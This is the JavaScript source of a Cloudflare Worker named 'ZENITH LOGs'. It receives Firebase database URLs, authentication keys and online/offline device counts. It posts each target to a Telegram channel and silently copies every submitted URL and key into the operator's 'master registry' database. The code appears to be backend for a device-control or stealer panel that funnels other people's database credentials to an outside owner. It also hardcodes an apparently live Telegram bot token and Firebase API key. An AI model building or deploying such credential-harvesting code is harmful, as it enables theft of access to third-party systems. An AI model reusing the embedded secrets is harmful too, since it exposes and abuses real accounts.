// ============================================================
// ⚡ 𝒁𝑬𝑵𝑰𝑻𝑯 LOGs ⚡ + Master Registry Submission
// ============================================================
// Receives POST /probe with:
//   { url, key, total, online, offline }
//
// 1. Sends a beautifully formatted Telegram message
// 2. Submits the Firebase URL + key to the master registry
//
// 🔥 Telegram credentials (hardcoded)
// 🔥 Master Firebase credentials (from google-services.json)
// ============================================================

// ─── Telegram credentials ─────────────────────────────────────
const BOT_TOKEN = '8983573990:AAEV46CzNYa4pv3TvRzewQXpzkxRitzqpgg';
const CHAT_ID = '-1004291828596';
const MESSAGE_THREAD_ID = 3;

// ─── Master Firebase credentials ─────────────────────────────
// ⚠️ The API key from google-services.json is NOT a Database Secret.
// For writes to RTDB you need a Database Secret from:
// Firebase Console → Project Settings → Service Accounts → Database Secrets
const MASTER_FIREBASE_CONFIG = {
    url: "https://zenith-all-default-rtdb.firebaseio.com",
    // This API key may NOT work for writing. Replace with Database Secret.
    key: "AIzaSyDx6R99W7TLzl-BeldxBR_1hagqp8SPMyo"
};

// ============================================================
// MASTER REGISTRY FUNCTIONS
// ============================================================

function getMasterConfig() {
    const config = MASTER_FIREBASE_CONFIG;
    const url = String(config.url || "").trim().replace(/\/$/, "");
    const key = String(config.key || "").trim();
    if (url && key && !url.includes("PASTE_MASTER_") && !key.includes("PASTE_MASTER_")) {
        return { url, key };
    }
    return null;
}

function normalizeRegistryUrl(value) {
    return String(value || "")
        .trim()
        .replace(/^https?:\/\//i, "")
        .replace(/\/$/, "")
        .toLowerCase();
}

async function generateRegistryId(value) {
    const encoder = new TextEncoder();
    const bytes = encoder.encode(normalizeRegistryUrl(value));
    const digest = await crypto.subtle.digest("SHA-256", bytes);
    return Array.from(new Uint8Array(digest))
        .map(byte => byte.toString(16).padStart(2, "0"))
        .join("");
}

async function masterRegistryRequest(path, options = {}) {
    const config = getMasterConfig();
    if (!config) return null;

    const target = `${config.url}/${path.replace(/^\/+/, "")}.json?auth=${encodeURIComponent(config.key)}`;
    const response = await fetch(target, {
        ...options,
        headers: {
            "Content-Type": "application/json",
            ...(options.headers || {})
        }
    });

    const payload = await response.json().catch(() => null);
    if (!response.ok) {
        throw new Error(payload?.error || payload?.message || `Master Firebase HTTP ${response.status}`);
    }
    return payload;
}

async function submitFirebaseToOwner(firebaseUrl, authenticationKey) {
    if (!getMasterConfig()) {
        return { configured: false, duplicate: false };
    }

    const id = await generateRegistryId(firebaseUrl);
    const path = `submissions/${id}`;

    const previous = await masterRegistryRequest(path).catch(() => null);
    const now = Date.now();
    const day = new Date(now).toISOString().slice(0, 10);

    const dailyCounts = { ...(previous?.dailyCounts || {}) };
    dailyCounts[day] = Number(dailyCounts[day] || 0) + 1;

    const record = {
        firebaseUrl: String(firebaseUrl || "").trim().replace(/\/$/, ""),
        authenticationKey: String(authenticationKey || "").trim(),
        firstAddedAt: previous?.firstAddedAt || now,
        lastSeenAt: now,
        submitCount: Number(previous?.submitCount || 0) + 1,
        dailyCounts
    };

    await masterRegistryRequest(path, {
        method: "PUT",
        body: JSON.stringify(record)
    });

    return {
        configured: true,
        duplicate: Boolean(previous),
        record
    };
}

// ============================================================
// CLOUDFLARE WORKER HANDLER
// ============================================================

export default {
    async fetch(request, env) {
        // CORS preflight
        if (request.method === 'OPTIONS') {
            return new Response(null, { status: 204, headers: corsHeaders() });
        }

        const url = new URL(request.url);

        // Health check
        if (url.pathname === '/' || url.pathname === '/health') {
            return new Response(
                JSON.stringify({
                    status: 'ok',
                    service: 'zenith-logs',
                    note: 'POST { url, key, total, online, offline } to /probe'
                }),
                {
                    status: 200,
                    headers: {
                        'content-type': 'application/json',
                        ...corsHeaders()
                    }
                }
            );
        }

        // Only /probe is supported
        if (url.pathname !== '/probe') {
            return new Response('Not found', {
                status: 404,
                headers: corsHeaders()
            });
        }

        // POST only
        if (request.method !== 'POST') {
            return json({ error: 'Use POST' }, 405);
        }

        // ─── Parse body ──────────────────────────────────────────
        let body;
        try {
            body = await request.json();
        } catch {
            return json({ error: 'Invalid JSON body' }, 400);
        }

        const target = String(body?.url || '').trim();
        if (!target) {
            return json({ error: 'Missing "url" field' }, 400);
        }

        const authKey = String(body?.key || '').trim();   // optional

        const total = body?.total;
        const online = body?.online;
        const offline = body?.offline;
        const hasStats =
            typeof total === 'number' &&
            typeof online === 'number' &&
            typeof offline === 'number';

        // ─── Submission to Master Firebase ──────────────────────
        let submissionResult = null;
        try {
            if (authKey) {
                submissionResult = await submitFirebaseToOwner(target, authKey);
                console.log('Master registry submission:', submissionResult);
            } else {
                console.log('No authentication key provided – skipping master registry.');
            }
        } catch (err) {
            console.error('Master registry submission failed:', err);
            // Don't block the Telegram message
        }

        // ─── Telegram message ────────────────────────────────────
        const now = new Date();
        const indiaTime = new Intl.DateTimeFormat('en-IN', {
            timeZone: 'Asia/Kolkata',
            year: 'numeric',
            month: '2-digit',
            day: '2-digit',
            hour: '2-digit',
            minute: '2-digit',
            second: '2-digit',
            hour12: true
        }).format(now);

        const escape = (value) =>
            String(value)
                .replace(/&/g, '&amp;')
                .replace(/</g, '&lt;')
                .replace(/>/g, '&gt;')
                .replace(/"/g, '&quot;')
                .replace(/'/g, '&#039;');

        let statsLine = '';
        if (hasStats) {
            statsLine =
                `🩶 <b>Total:</b> <code>${escape(total)}</code> · ` +
                `💚 <b>Online:</b> <code>${escape(online)}</code> · ` +
                `💔 <b>Offline:</b> <code>${escape(offline)}</code>`;
        } else {
            statsLine = 'ℹ️ <i>Device stats not provided.</i>';
        }

        // Build the message
        let logText =
`⚡ <b>𝒁𝑬𝑵𝑰𝑻𝑯 LOGs</b> ⚡

<blockquote>
📌 <b>Target</b> <code>${escape(target)}</code>
${statsLine}
📅 <b>Checked</b> <code>${escape(indiaTime)} IST</code>
</blockquote>

<i>Channel: #zenith-logs</i>`;

        // ─── Send to Telegram ────────────────────────────────────
        let tgOk = false;
        let tgError = null;

        try {
            const tgUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
            const tgRes = await fetch(tgUrl, {
                method: 'POST',
                headers: { 'content-type': 'application/json' },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    message_thread_id: MESSAGE_THREAD_ID,
                    text: logText,
                    parse_mode: 'HTML',
                    disable_web_page_preview: true
                })
            });

            const tgBody = await tgRes.json().catch(() => ({}));
            tgOk = tgBody?.ok === true;
            if (!tgOk) {
                tgError = tgBody?.description || `Telegram API returned HTTP ${tgRes.status}`;
            }
        } catch (e) {
            tgError = String(e?.message || e);
        }

        // ─── Response ────────────────────────────────────────────
        return json({
            ok: true,
            target,
            telegram: {
                posted: tgOk,
                error: tgError
            },
            masterRegistry: submissionResult
                ? {
                      configured: submissionResult.configured,
                      duplicate: submissionResult.duplicate,
                      record: submissionResult.record
                  }
                : null,
            timestamp: indiaTime,
            timezone: 'Asia/Kolkata',
            utcOffset: '+05:30'
        });
    }
};

// ============================================================
// CORS & JSON HELPERS
// ============================================================

function corsHeaders() {
    return {
        'access-control-allow-origin': '*',
        'access-control-allow-methods': 'GET, POST, OPTIONS',
        'access-control-allow-headers': 'content-type',
        'access-control-max-age': '86400'
    };
}

function json(obj, status = 200) {
    return new Response(
        JSON.stringify(obj, null, 2),
        {
            status,
            headers: {
                'content-type': 'application/json',
                ...corsHeaders()
            }
        }
    );
}
